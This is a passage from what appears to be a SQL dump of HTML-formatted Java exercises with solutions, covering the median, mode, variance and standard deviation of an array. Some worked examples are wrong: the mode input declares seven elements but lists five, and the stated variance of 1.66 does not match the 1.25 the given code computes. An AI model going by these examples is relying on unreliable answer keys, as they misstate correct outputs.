(ordered) array, the mid-value is\r\nthe median.&nbsp; The median is the total of\r\nthe middle two integers divided by two if the array has an even number of\r\nelements. The median is a more accurate indicator of the group\'s central\r\ntendency since it is not influenced by unusually high or low characteristic\r\nvalues. For Example mean of 1, 2, and 1000 is 334 but, median is 3. In mean,\r\nhigher value (1000) influenced the results.&nbsp;</span>Get an\r\narray of Integers <i>arr[]</i> with size <i>n</i> and find the median value of <i>arr[]</i></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">Assume your\r\narray inputs are unsorted.<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">Example<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">Input 1:<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">5<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">5 2 3 1 4<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">Output 1:<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">3<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">Explanation:<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\"><span lang=\"EN-US\">(3 is the\r\nmiddle element in [1 2 3 4 5] )</span></p><p class=\"MsoNormal\">Input 2:<br></p><p class=\"MsoNormal\"><span lang=\"EN-US\">6<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">5 2 6 3 1 7<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Output 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">4<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Explanation:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">(3 and 5 are\r\nthe middle elements in [1 2 3 5 6 7] and average of 3 and 5 is 4)<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"text-align:justify\"><span lang=\"EN-US\"><o:p></o:p></span></p>','B','<p><span style=\"font-family: &quot;Times New Roman&quot;;\">import java.util.*;</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">class Median</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">public static void main(String args[])</span></span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Variable and&nbsp; Object Declarations</b></span><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">Scanner input = new Scanner(System.in);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int n;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">double median;</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Getting size of Array &amp; Declare Array arr[]</b></span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">n = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int arr[] = new int[n];</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Get n values to array arr[]</b></span><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">arr[i] = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//sort the array before taking middle value</b></span><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">Arrays.sort(arr);</span></span></p><p><br></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">if(n%2==0)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">//Median for Even number of Elements</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">median = (double)(arr[n/2-1] + arr[n/2]) / 2;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">else</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		<b>	</b></span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Median for ODD number of Elements</b></span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">median = arr[n/2];</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">			</span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">System.out.print(median);</span></span></p><p><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></p>',NULL,'',31,'','',''),(1127,'Mode of an Array in Java','mode-of-an-array-in-java','<p class=\"MsoNormal\"><span lang=\"EN-US\">Mode is the\r\nnumber which occurs most often in the array. Get an array of Integers <i>arr[]</i> with size <i>n</i> and find the mode value of <i>arr[].<o:p></o:p></i></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Example<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Input 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">7<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">5 2 3 2 4<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Output 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">2<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Explanation:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\"><span lang=\"EN-US\">(2 occurred\r\n2 times and it is the most occurred compared to other numbers.)<o:p></o:p></span></p>','B','<p><span style=\"font-family: &quot;Times New Roman&quot;;\">import java.util.*;</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">class Mode</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">public static void main(String args[])</span></span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Variable and&nbsp; Object Declarations</b></span><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">Scanner input = new Scanner(System.in);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int n;</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Getting size of Array &amp; Declare Array arr[]</b></span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">n = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int arr[] = new int[n];</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	<b>	</b></span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Get n values to array arr[]</b></span><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">arr[i] = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Brute Force Approach to identify the mode (O(n^2) Time Complexity)</b></span><br></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int max = 1;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int mode = arr[0];</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int i=0; i&lt;n;i++)</span><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int count = 1;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int j=i+1; j&lt;n; j++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">				</span><span style=\"font-family: &quot;Times New Roman&quot;;\">if(arr[i] == arr[j])</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">				</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">					</span><span style=\"font-family: &quot;Times New Roman&quot;;\">count+=1;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">				</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">if(count &gt; max)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">				</span><span style=\"font-family: &quot;Times New Roman&quot;;\">max=count;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">				</span><span style=\"font-family: &quot;Times New Roman&quot;;\">mode = arr[i];</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}&nbsp;</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">System.out.print(mode);</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//This program couldn\'t print multiple mode</b></span></span></p><p><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></p>',NULL,'',31,'','',''),(1128,'Variance of an Array in Java','variance-of-an-array-in-java','<p class=\"MsoNormal\"><span lang=\"EN-US\">The\r\nvariance of an array&nbsp;indicates the degree to which\r\nthe&nbsp;numbers&nbsp;of the array&nbsp;vary from its&nbsp;mean value.&nbsp; Variance tells how values are spread out. Get\r\nan array of Integers <i>arr[]</i> with size <i>n</i> and calculate the variance of <i>arr[].</i>The Output should be printed in\r\ntwo decimal places.<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">&nbsp;</span>Example</p><p class=\"MsoNormal\"><span lang=\"EN-US\">Input 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">4<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">5 6 7 8<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Output 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">1.66<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Explanation:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\"><span lang=\"EN-US\">(Variance\r\nis average of squared difference between the numbers and mean value)<o:p></o:p></span></p>','B','<p><span style=\"font-family: &quot;Times New Roman&quot;;\">import java.util.*;</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">class Variance&nbsp;</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">public static void main(String args[])</span></span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></p><p><span style=\"white-space: pre;\"><span style=\"font-family: &quot;Times New Roman&quot;;\">	</span><b><span style=\"font-family: &quot;Times New Roman&quot;;\">	</span></b></span><b><span style=\"font-family: &quot;Times New Roman&quot;;\">//Variable and&nbsp; Object Declarations</span></b><br></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">Scanner input = new Scanner(System.in);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int n;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">float sum = 0f;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">float mean, variance;</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\"><b>//Getting size of Array &amp; Declare Array arr[]</b></span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">n = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">int arr[] = new int[n];</span></span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><b><span style=\"font-family: &quot;Times New Roman&quot;;\">//Get n values to array arr[]</span></b></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">arr[i] = input.nextInt();</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><br></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><b><span style=\"font-family: &quot;Times New Roman&quot;;\">//Calcualte Sum and Mean</span></b></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">sum+= arr[i];</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">mean = sum/n;</span></span></p><p><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><b><span style=\"font-family: &quot;Times New Roman&quot;;\">//Calculate Variance for Whole Population</span></b><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">sum=0;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">for(int i = 0; i&lt;n; i++)</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">{</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">double diff = arr[i]-mean;</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">			</span><span style=\"font-family: &quot;Times New Roman&quot;;\">sum += Math.pow(diff,2);</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">variance = sum/(n);</span></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">		</span><span style=\"font-family: &quot;Times New Roman&quot;;\">System.out.printf(\"%.2f\", variance);</span></span></p><p><span style=\"white-space: normal; font-family: &quot;Times New Roman&quot;;\">		</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">&nbsp; &nbsp; &nbsp; </span><span style=\"white-space: pre; font-family: &quot;Times New Roman&quot;;\">	</span><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></p><p><span style=\"font-family: &quot;Times New Roman&quot;;\">}</span></p>',NULL,'',31,'','',''),(1129,'Standard Deviation of an Array in Java','standard-deviation-of-an-array-in-java','<p class=\"MsoNormal\"><span lang=\"EN-US\">The square\r\nroot of variance is the standard deviation. It is a gauge of how far data\r\ndeviates from the mean. Get an array of Integers <i>arr[]</i> with size <i>n</i> and calculate\r\nthe standard deviation of <i>arr[].</i>The\r\nOutput should be printed in two decimal places.<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Example<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Input 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">4<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">5 6 7 8<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Output 1:<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">1.12<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-US\">Explanation:<o:p></o:p></span></p><p>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n</p><p class=\"MsoNormal\"><span lang=\"EN-US\">(Standard\r\nDeviation is the Square root of Variance)<o:p></o:p></span></p>','B','<p>import java.util.*;</p><p>class Sd</p><p>{</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">	</span>public static void main(String args[])</span></p><p>&nbsp; &nbsp; <span style=\"white-space:pre\">	</span>{</p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span><b>//Variable and&nbsp; Object Declarations</b></span></p><p>&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"white-space:pre\">		</span>Scanner input = new Scanner(System.in);</p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int n;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>float sum = 0f;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>double mean, variance, sd;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span><b>//Getting size of Array &amp; Declare Array arr[]</b></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>n = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>int arr[] = new int[n];</span></p><p><br></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span><b>//Get n values to array arr[]</b></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>arr[i] = input.nextInt();</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><br></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span><b>//Calcualte Sum and Mean</b></span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>sum+= arr[i];</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>mean = sum/n;</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span><b>//Calculate Variance for Whole Population</b></span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>sum=0;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>for(int i = 0; i&lt;n; i++)</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>{</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>double diff = arr[i]-mean;</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">			</span>sum += Math.pow(diff,2);</span></p><p><span style=\"white-space: normal;\"><span style=\"white-space:pre\">		</span>}</span></p><p><span style=\"white-space: pre; white-space: normal;\">		</span></p><p><span style=\"white-space: 